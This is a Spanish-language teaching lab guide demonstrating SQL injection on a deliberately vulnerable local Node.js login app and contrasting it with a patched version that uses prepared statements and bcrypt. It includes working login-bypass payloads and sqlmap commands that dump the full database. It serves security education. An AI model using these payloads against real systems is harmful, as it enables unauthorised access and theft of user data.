# Demo 1 — SQL Injection (SQLi)

## Concepto

SQL Injection ocurre cuando una aplicación construye consultas SQL concatenando directamente el input del usuario, permitiendo que el atacante manipule la lógica de la base de datos.

**Código vulnerable (hacklab-vulnerable/server.js):**
```javascript
// ❌ INSEGURO: El atacante controla 'username' y 'password'
const query = `SELECT * FROM users WHERE username = '${username}' AND password = 'CONFIGURAR_LOCALMENTE'`;
```

Si el usuario ingresa `' OR '1'='1' --` como nombre de usuario, la query resultante es:
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = 'CONFIGURAR_LOCALMENTE'
```
La condición `OR '1'='1'` siempre es verdadera y el `--` comenta el resto. La base de datos devuelve el primer usuario (generalmente el admin).

---

## Paso a paso del ataque

### Requisitos en Kali Linux
```bash
# Verificar que sqlmap está disponible
sqlmap --version

# Verificar conectividad con el host
ping HOST_IP
curl http://HOST_IP:3000
```
> Reemplace `HOST_IP` con la IP real de su máquina Windows (ej: 192.168.1.100)

---

### Parte 1: Ataque manual desde el navegador

1. Abra el navegador en Kali y vaya a `http://HOST_IP:3000/login.html`
2. En el campo **Usuario**, ingrese exactamente:
   ```
   ' OR '1'='1' --
   ```
3. En el campo **Contraseña**, escriba cualquier cosa: `abc`
4. Haga clic en **Ingresar**

**Resultado esperado:** Acceso concedido como el usuario `admin` sin conocer la contraseña.

Variaciones a mostrar:
```
# Acceder como un usuario específico (sin saber su contraseña)
jlopez' --

# Extraer datos (dependiendo del motor SQL)
' OR '1'='1' ORDER BY 1 --
```

---

### Parte 2: Ataque automatizado con sqlmap

```bash
# Detección básica de vulnerabilidad SQLi
sqlmap -u "http://HOST_IP:3000/api/login" \
  --data="username=admin&password=test" \
  --method=POST \
  --batch \
  --level=2

# Volcar la base de datos completa
sqlmap -u "http://HOST_IP:3000/api/login" \
  --data="username=admin&password=test" \
  --method=POST \
  --batch \
  --dump \
  --level=2

# Listar tablas disponibles
sqlmap -u "http://HOST_IP:3000/api/login" \
  --data="username=admin&password=test" \
  --method=POST \
  --batch \
  --tables \
  --level=2
```

**Resultado esperado:** sqlmap identifica la vulnerabilidad y extrae todos los usuarios, contraseñas, saldos y transacciones de la base de datos.

---

### Parte 3: Repetir contra la versión SEGURA

```bash
# Mismo ataque contra el puerto 4000 (versión segura)
sqlmap -u "http://HOST_IP:4000/api/login" \
  --data="username=admin&password=test" \
  --method=POST \
  --batch \
  --level=2
```

**Resultado esperado:** sqlmap no encuentra vulnerabilidades. El ataque manual también falla — el sistema trata el input como texto literal, no como código SQL.

---

## Comparación de código

| Aspecto | Vulnerable (puerto 3000) | Seguro (puerto 4000) |
|---------|--------------------------|----------------------|
| Query SQL | Concatenación de strings | Parámetros enlazados (`?`) |
| Input del usuario | Se ejecuta como SQL | Se trata como dato literal |
| Error expuesto | Sí (mensaje de BD) | No (mensaje genérico) |

**Código seguro (hacklab-seguro/server.js):**
```javascript
// ✅ SEGURO: El '?' es un marcador de posición — el input nunca toca la query
const user = db.prepare('SELECT * FROM users WHERE username = ?').get(username);
const ok   = await bcrypt.compare(password, user.password);
```

---

## Protecciones adicionales implementadas en la versión segura

- **Prepared statements**: La base de datos separa el código SQL del dato
- **bcrypt**: Las contraseñas están hasheadas, aunque se filtre la BD no son útiles
- **Mensajes genéricos**: No se expone información interna de errores
- **Validación de tipo**: Se verifica que el input sea un string antes de procesarlo

---

## Referencias

- OWASP Top 10 A03:2021 — Injection: https://owasp.org/Top10/A03_2021-Injection/
- OWASP SQL Injection Prevention Cheat Sheet
